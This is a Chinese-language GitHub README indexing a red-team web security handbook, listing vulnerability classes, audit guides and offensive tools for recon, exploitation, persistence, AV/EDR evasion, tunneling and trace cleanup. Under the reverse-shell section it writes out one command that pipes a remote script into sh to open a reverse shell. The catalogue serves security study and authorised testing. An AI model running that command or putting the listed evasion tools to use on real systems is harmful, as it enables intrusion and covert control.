---
project: web-sec
stars: 1832
description: WEB安全手册(红队安全技能栈)，漏洞理解，漏洞利用，代码审计和渗透测试总结。【持续更新】
url: https://github.com/ReAbout/web-sec
---

WEB 安全手册
========

【声明】个人的快速查询目录，经验整理，仅供参考。  
【内容】包括个人对漏洞理解、漏洞利用、代码审计和渗透测试的整理，也收录了他人相关的知识的总结和工具的推荐。

目录
--

-   0x00 技能栈
-   0x01 漏洞理解篇(Vulnerability)
    -   1.1 前端
    -   1.2 后端
    -   1.3 打造自己的知识库
-   0x02 漏洞利用篇(Exploit)
    -   2.1 前端安全-XSS
    -   2.2 前端安全-CSRF
    -   2.9 Server-side request forgery (SSRF)
    -   2.4 \[注入\]SQL注入&数据库漏洞利用
    -   2.5 \[注入\]模板注入 Server Side Template Injection (SSTI)
    -   2.6 \[注入\]命令注入&代码执行
    -   2.7 \[注入\]Xpath注入
    -   2.8 XML External Entity (XXE)
    -   2.9 文件操作漏洞
    -   2.10 反序列化漏洞
    -   2.11 包含漏洞
    -   2.12 Java-特性漏洞
    -   2.13 NodeJs-特性漏洞
    -   2.14 不一致性
-   0x03 代码审计篇(Audit)
    -   3.1 PHP
    -   3.2 JAVA
    -   3.3 .NET
    -   3.4 Perl CGI
-   0x04 渗透篇(Penetration)
    -   4.1 网络预置
        -   4.1.1 代理客户端(环境准备)
        -   4.1.2 常规信息（单兵）
        -   4.1.3 资产搜索引擎（大数据）
        -   4.1.4 移动端信息收集
        -   4.1.5 近源渗透（WiFi）
    -   4.2 网络接入(exp)
        -   4.2.1 漏洞验证（扫描器）
            -   4.2.1.1 主动式
            -   4.2.1.2 被动式
        -   4.2.2漏洞利用(1day)
            -   4.2.2.1 漏洞利用知识
            -   4.2.2.2 漏洞利用工具
            -   4.2.2.3 dnslog平台
        -   4.2.3 字典
    -   4.3 权限获取&提升
        -   4.3.1 Win
        -   4.3.2 Linux
        -   4.3.3 Docker&Sandbox逃逸
    -   4.4 权限维持&后门
        -   4.4.1 通用
        -   4.4.2 Shell会话
        -   4.4.2 Webshell
        -   4.4.3 PC & Server
        -   4.4.4 Mobile (Android & ios)
    -   4.5 免杀
        -   4.5.1 二进制免杀
        -   4.5.2 webshell免杀和WAF逃逸
    -   4.6 隧道&代理
        -   4.6.1 TCP隧道
        -   4.6.2 HTTP隧道
        -   4.6.3 DNS隧道
        -   4.6.3 ICMP隧道
    -   4.7 后渗透
        -   4.7.1 内网信息获取&执行
        -   4.7.2 轻量级扫描工具
        -   4.7.3 渗透框架
        -   4.7.4 域渗透
        -   4.7.5 云平台
    -   4.8 反溯源
    -   4.9 协同

0x00 技能栈
--------

依照红队的流程分工，选择适合自己的技能栈发展。

> 越接近中心的能力点越贴近web技术栈，反之亦然。可以根据自身情况，选择技术栈的发展方向。

0x01 漏洞理解篇(Vulnerability)
-------------------------

### 1.1 前端

> 同源策略 & CSP & JOSNP

-   跨域安全

### 1.2 后端

> 应用分层 & 漏洞分类

-   错综复杂的后端逻辑及安全

### 1.3 打造自己的知识库

> 爬取范围包括先知社区、安全客、Seebug Paper、跳跳糖、奇安信攻防社区、棱角社区

-   **\[Tool\]** 推送安全情报爬虫@Le0nsec

0x02 漏洞利用篇(Exploit)
-------------------

### 2.1 前端安全-XSS

> XSS 利用的是用户对指定网站的信任

-   Cross Site Scripting (XSS)

### 2.2 前端安全-CSRF

> CSRF 利用的是网站对用户网页浏览器的信任

-   Client-side request forgery (CSRF)

### 2.9 Server-side request forgery (SSRF)

-   SSRF

### 2.4 \[注入\]SQL注入&数据库漏洞利用

-   SQL injection - MySQL
-   SQL injection - Oracle
-   SQL injection - MSSQL

> MySQL，Oracle，MSSQL和PostgreSQL的OOB方法

-   SQL injection - 信息外带(OOB)
    
-   Redis 漏洞利用
    

> go写的命令行版本

-   **\[Tool\]** 数据库综合利用工具

> 程序检测参数不能为空，导致空口令无法利用

-   **\[Tool\]** 数据库综合利用工具
-   **\[Tool\]** MSSQL利用工具

### 2.5 \[注入\]模板注入 Server Side Template Injection (SSTI)

> MVC架构中，模板参数恶意输入产生的安全问题

-   STTI 总述
-   SSTI -Python
-   SSTI -PHP
-   SSTI Payload @payloadbox

### 2.6 \[注入\]命令注入&代码执行

-   命令注入&代码执行-PHP
-   命令注入&代码执行-Java

### 2.7 \[注入\]Xpath注入

> XPath 即为 XML 路径语言

-   XPath Injection

### 2.8 XML External Entity (XXE)

-   XXE

### 2.9 文件操作漏洞

-   文件上传漏洞
-   文件上传漏洞WAF绕过-JSP

> 远古时期的通杀利器

-   FCKeditor编辑器漏洞利用

### 2.10 反序列化漏洞

> php,java只能序列化数据，python可以序列化代码。

-   反序列化漏洞-PHP
-   反序列化漏洞-Java
-   绕过高版本Jdk的限制进行Jndi注入利用
-   **\[Tool\]** 反序列化漏洞利用工具-Java ysoserial

> 拓展payload和内存马

-   **\[Tool\]** 反序列化漏洞利用工具 Y4er

> 拓展payload和添加脏数据绕过waf功能（已删库）

-   **\[Tool\]** 反序列化漏洞利用工具 su18

### 2.11 包含漏洞

-   包含漏洞-PHP

### 2.12 Java-特性漏洞

-   表达式(EL)注入
-   Spring表达式(SPEL)注入

> Confluence和Struct2都使用OGNL

-   OGNL表达式注入
-   SprintBoot漏洞利用清单@LandGrey

> 按照清单做的配套工具

-   **\[Tool\]** SprintBoot漏洞利用工具

### 2.13 NodeJs-特性漏洞

-   Node.js 原型链污染

### 2.14 不一致性

> 利用前后DNS解析的不一致（劫持或者逻辑问题）

-   DNS rebinding 攻击

> 前后端不一致性

-   请求走私总结@chenjj

0x03 代码审计篇(Audit)
-----------------

### 3.1 PHP

> 自己整理的PHP代码审计

-   PHP代码审计手册
-   PHP代码审计@bowu678
-   PHP代码审计入门指南@burpheart

### 3.2 JAVA

> 自己整理的Java代码审计

-   Java代码审计手册
-   Java代码审计@cn-panda
-   Java安全@Y4tacker
-   Java漏洞平台@j3ers3

### 3.3 .NET

-   .Net反序列化@Ivan1ee

### 3.4 Perl CGI

> Perl CGI快速上手，了解Perl语言特性

-   Perl基础&代码审计@mi1k7ea

0x04 渗透篇(Penetration)
---------------------

【流程】网络预置（准备&信息收集）-->网络接入（外网突破）-->权限获取和提升-->权限维持（后门）-->后渗透  
【基础】---免杀+++反溯源+++协同---

### 4.1 网络预置

#### 4.1.1 代理客户端(环境准备)

> 操作系统 on VM + OpenWrt网关 on VM = 全局跳板

-   全局代理\[VMware\]：Openwrt on VMware网关方案

> 全局代理，虚拟网卡，需要手动配路由

-   全局代理\[Win\]：Windows下socks客户端全局代理终极解决方案——tun2socks

> SSTap全局代理也是基于虚拟网卡方案，可惜已停止更新，推荐使用1.0.9.7版本

-   **\[Tool\]** Windows下全局代理客户端工具 SSTap

> 【推荐!】Clash for Windows支持TAP模式基于虚拟网卡方案，走全局

-   **\[Tool\]** Windows下全局代理客户端工具 Clash for Windows

> Proxifier 全局代理支持并不好，可以设置规则选择指定程序走代理或直连

-   **\[Tool\]** Windows下代理客户端工具 Proxifier
    
-   **\[Tool\]** Windows版 proxychains
    

#### 4.1.2 常规信息（单兵）

-   外网信息收集思路
-   IP地址信息网站 ipip.net
-   IP反查域名和子域名查询 rapiddns.io

> 有域名层级图，更直观

-   子域名查询 dnsdumpster

#### 4.1.3 资产搜索引擎（大数据）

-   fofa.so
-   shodan.io
-   zoomeye.org
-   censys.io

#### 4.1.4 移动端信息收集

> 从移动端拓展目标信息

-   **\[Tool\]** 移动端信息收集工具 AppInfoScanner
-   **\[Tool\]** 安全分析框架 MobSF

#### 4.1.5 近源渗透（WiFi）

> 高通410随身wifi改造

-   打造近源渗透工具

### 4.2 网络接入(exp)

#### 4.2.1 漏洞验证（扫描器）

> 工欲其善必先利器

##### 4.2.1.1 主动式

-   **\[Tool\]** AWVS Docker版
-   **\[Tool\]** 长亭的扫描器 Xray
-   **\[Tool\]** Vulmap
-   **\[Tool\]** 红队综合渗透框架SatanSword@Lucifer1993

##### 4.2.1.2 被动式

> 将Burpusuite打造成一个被动式扫描器

-   **\[Tool\]** BurpSutie 插件集合@Mr-xn

#### 4.2.2漏洞利用(1day)

##### 4.2.2.1 漏洞利用知识

-   漏洞索引表【待整理】

> IoT安全 & web安全& 系统漏洞 1day整理

-   漏洞利用wiki
-   红队中易被攻击的一些重点系统漏洞整理@r0eXpeR
-   织梦全版本漏洞扫描@lengjibo

##### 4.2.2.2 漏洞利用工具

> oa

-   **\[Tool\]** 国内OA系统漏洞检测

> struts2：利用功能已删除，仅支持检测

-   **\[Tool\]** Struts2漏洞扫描&利用

> struts2：GUI，功能齐全

-   **\[Tool\]** Struts2漏洞扫描&利用

> shiro：GUI，支持对Shiro550（硬编码秘钥）和Shiro721（Padding Oracle）的一键化检测

-   **\[Tool\]** shiro反序列化漏洞利用

> shiro：Python,方便修改代码，支持2种加密格式

-   **\[Tool\]** shiro反序列化漏洞利用

> fastjson

-   **\[Tool\]** Fastjson漏洞快速利用框架

> fastjson：各类poc,方便手动测试

-   Fastjson姿势技巧集合@safe6Sec

> exchange:爆破

-   **\[Tool\]** EBurstGo Exchange 服务器 Web 接口爆破邮箱账户

> confluence

-   **\[Tool\]** ConfluenceMemshell Confluence利用工具(CVE-2021-26084，CVE-2022-26134，CVE\_2023\_22515，CVE-2023-22527)

##### 4.2.2.3 dnslog平台

> 用于出网检测，无回显命令执行检测

-   dnslog.cn
-   ceye

> 【推荐!】好用，开源

-   requestrepo

#### 4.2.3 字典

-   常用的字典，用于渗透测试、SRC漏洞挖掘、爆破、Fuzzing等@insightglacier
-   Fuzzing相关字典@TheKingOfDuck

> 全拼用户名10w

-   爆破字典

### 4.3 权限获取&提升

#### 4.3.1 Win

**权限获取：**

> 离线|在线|破解

-   Windows 认证凭证获取
-   **\[Tool\]** mimikatz Windows认证凭证提取神器
-   **\[Tool\]** go-secdump 利用smb远程无文件落地获取@jfjallid

**提权:**

-   Windows提权检测工具 Windows Exploit Suggester

> 已经停止更新到CVE-2018

-   Windows提权漏洞集合@SecWiki
-   PetitPotato for Win10
-   CVE-2022-24481

#### 4.3.2 Linux

**权限获取：**

-   Linux 认证凭证获取

**提权:**

-   Linux 提权检测脚本 lse.sh
-   Linux setuid提权

> 已经停止更新到CVE-2018

-   Linux提权漏洞集合@SecWiki

#### 4.3.3 Docker&Sandbox逃逸

-   Dokcer容器逃逸@duowen1

### 4.4 权限维持&后门

#### 4.4.1 通用

> backdoor生成，meterpreter操作指令

-   Meterpreter of Metasploit 使用教程

#### 4.4.2 Shell会话

-   反弹/正向 Shell & 升级交互式Shell (Linux&Win)

> curl https://reverse-shell.sh/192.168.0.69:1337 | sh

-   **\[Tool\]** reverse-shell

#### 4.4.2 Webshell

-   **\[Tool\]** WebShell管理工具 菜刀
-   **\[Tool\]** WebShell管理工具 蚁剑
-   **\[Tool\]** WebShell管理工具 冰蝎
-   **\[Tool\]** WebShell管理工具 哥斯拉
-   收集的各种Webshell@tennc
-   Webshell 命令执行失败问题解决

#### 4.4.3 PC & Server

-   **\[Tool\]** Cobalt Strike
-   Cobalt Strike资料汇总@zer0yu

#### 4.4.4 Mobile (Android & ios)

### 4.5 免杀

#### 4.5.1 二进制免杀

-   免杀系列文章及配套工具@TideSec

##### shellcode加载器

-   **\[Tool\]** LoaderGo免杀工具@di0xide-U
-   **\[Tool\]** 千机-红队免杀木马自动生成器@Pizz33
-   **\[Tool\]** RingQ@T4y1oR
-   **\[Tool\]** darkPulse@fdx-xdf

##### kill杀软

-   **\[Tool\]** 强关进程EDR-XDR-AV-Killer@EvilBytecode
-   **\[Tool\]** 强关Windows defender@es3n1n

##### rootkit

-   **\[Tool\]** shadow-rs@joaoviictorti

#### 4.5.2 webshell免杀和WAF逃逸

-   Webshell免杀&WAF逃逸
-   **\[Tool\]** 哥斯拉WebShell免杀生成@Tas9er
-   **\[Tool\]** 冰蝎WebShell免杀生成@Tas9er
-   **\[Tool\]** 免杀webshell生成集合工具@cseroad
-   **\[Tool\]** XG拟态-Webshell静态免杀+流量逃逸@xiaogang000
-   **\[Tool\]** 哥斯拉二次开发-WAF逃逸+免杀@kong030813

### 4.6 隧道&代理

#### 4.6.1 TCP隧道

-   SSH 端口转发&开socks5
-   Iptables 端口复用

> FRP 客服端和服务端配合的端口转发工具

-   **\[Tool\]** 反向端口转发工具 FRP

> Venom 可以嵌套多层代理，适合多层无外网的渗透测试，停止更新

-   **\[Tool\]** 内网多级代理服务端工具 Venom

> 【推荐!】比Venom更加稳定，持续更新

-   **\[Tool\]** 内网多级代理服务端工具 Stowaway

#### 4.6.2 HTTP隧道

> HTTP代理，国内更新维护

-   **\[Tool\]** HTTP代理 Neo-reGeorg

> HTTP代理，号称性能是neo的10倍

-   **\[Tool\]** HTTP代理 suo5

#### 4.6.3 DNS隧道

-   **\[Tool\]** DNS隧道工具 iodine

#### 4.6.3 ICMP隧道

-   **\[Tool\]** ICMP隧道工具 PingTunnel

### 4.7 后渗透

#### 4.7.1 内网信息获取&执行

> 信息获取 & 远程文件操作 & 远程执行命令 & ipc$ & wmi & winrm

-   Windows 主机常用命令

> 超强神器，wmi,smb等执行脚本，python方便liunx使用

-   **\[Tool\]** Impacket

> 可以提取流量中用户名&密码，NTML Hash，图片等，以及绘制网络拓扑。

-   **\[Tool\]** 流量取证工具 BruteShark

> Windows rdp相关的登录记录导出工具。

-   **\[Tool\]** 浏览器数据导出解密工具
-   **\[Tool\]** SharpRDPLog

> Xshell在本地保存的密码进行解密

-   **\[Tool\]** SharpXDecrypt

#### 4.7.2 轻量级扫描工具

> 内网扫描神器，go语言跨平台，效率快，支持各类口令爆破，还有主机识别和web服务识别。

-   **\[Tool\]** fscan

> k8 team的内网扫描器

-   **\[Tool\]** Landon

#### 4.7.3 渗透框架

-   **\[Tool\]** 后渗透利用神器 Metasploit
-   **\[Tool\]** 内网横向拓展系统 InScan
-   **\[Tool\]** 开源图形化内网渗透工具 Viper

#### 4.7.4 域渗透

-   域渗透@uknowsec
-   域提权：MS14-068,CVE-2020-1472(Zerologon),CVE-2021-42287/CVE-2021-42278,CVE-2022-26923

#### 4.7.5 云平台

> k8s渗透

-   从零开始的Kubernetes攻防@neargle

> 通过accesskey获取相关主机权限执行命令

-   **\[Tool\]** Aliyun Accesskey Tool
-   **\[Tool\]** CF 云环境利用框架

### 4.8 反溯源

-   Linux 痕迹清理
-   攻击和反制@Getshell
-   **\[Tool\]** xhide linux进程名隐藏

### 4.9 协同

-   HackMD markdown协同工具(Docker版)

> 简单，美观

-   文件管理系统

Other
-----

toc目录生成工具
